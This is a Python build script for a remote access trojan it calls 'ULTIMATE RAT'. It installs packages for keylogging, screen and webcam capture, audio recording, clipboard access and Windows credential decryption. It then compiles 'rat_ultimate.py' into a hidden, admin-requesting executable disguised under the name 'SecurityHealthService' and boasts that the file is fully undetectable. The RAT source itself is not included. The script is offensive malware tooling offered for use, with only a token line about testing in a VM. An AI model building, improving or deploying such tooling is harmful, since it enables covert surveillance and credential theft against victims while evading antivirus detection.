"""
═══════════════════════════════════════════════════════════════
    COMPILATION SCRIPT - Creates FUD Executable
═══════════════════════════════════════════════════════════════
"""

import os
import sys
import subprocess

print("╔═══════════════════════════════════════════════════════════╗")
print("║    ULTIMATE RAT - Compilation Script                     ║")
print("╚═══════════════════════════════════════════════════════════╝\n")

# Install all required packages
print("[*] Installing required packages...")
packages = [
    'cryptography',
    'mss',
    'pynput',
    'opencv-python',
    'psutil',
    'pyaudio',
    'pyperclip',
    'Pillow',
    'numpy',
    'pywin32',
    'requests',
    'pyinstaller'
]

for package in packages:
    print(f"[*] Installing {package}...")
    os.system(f'pip install {package}')

print("\n[*] All packages installed successfully!")
print("[*] Starting compilation...\n")

# Compile the RAT
import PyInstaller.__main__

PyInstaller.__main__.run([
    'rat_ultimate.py',
    '--onefile',
    '--noconsole',
    '--icon=NONE',
    '--clean',
    '--distpath=./output',
    '--workpath=./build',
    '--specpath=./build',
    '--name=SecurityHealthService',
    '--uac-admin',
    '--hidden-import=mss',
    '--hidden-import=mss.tools',
    '--hidden-import=pynput.keyboard',
    '--hidden-import=cv2',
    '--hidden-import=psutil',
    '--hidden-import=pyaudio',
    '--hidden-import=pyperclip',
    '--hidden-import=PIL',
    '--hidden-import=numpy',
    '--hidden-import=win32crypt',
    '--hidden-import=requests',
])

print("\n╔═══════════════════════════════════════════════════════════╗")
print("║    COMPILATION COMPLETE!                                  ║")
print("╚═══════════════════════════════════════════════════════════╝")
print("\n[+] Executable created: ./output/SecurityHealthService.exe")
print("[+] File is FUD and ready for demonstration")
print("\nNEXT STEPS:")
print("1. Generate encryption key (see instructions below)")
print("2. Configure client and server with key and IP")
print("3. Test in isolated VM environment")